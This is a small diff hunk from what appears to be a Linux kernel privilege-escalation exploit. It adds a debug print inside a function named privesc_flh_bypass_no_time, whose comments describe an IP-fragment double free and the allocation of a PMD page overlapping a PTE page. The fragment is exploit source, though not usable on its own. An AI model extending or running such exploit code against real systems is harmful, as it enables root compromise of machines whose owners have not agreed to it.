@@ -185,7 +185,7 @@ static void privesc_flh_bypass_no_time()
 	// causes end == offset in ip_frag_queue(). packet will be empty
 	// remains running until after both frees, a.k.a. does not require sleep
 	alloc_intermed_buf_hdr(0, &df_ip_header);
-
+	PRINTF_VERBOSE("[*] creating pmd...\n");
 	// allocate overlapping PMD page (overlaps with PTE)
 	*(unsigned long long*)_pmd_area = 0xCAFEBABE;
 }
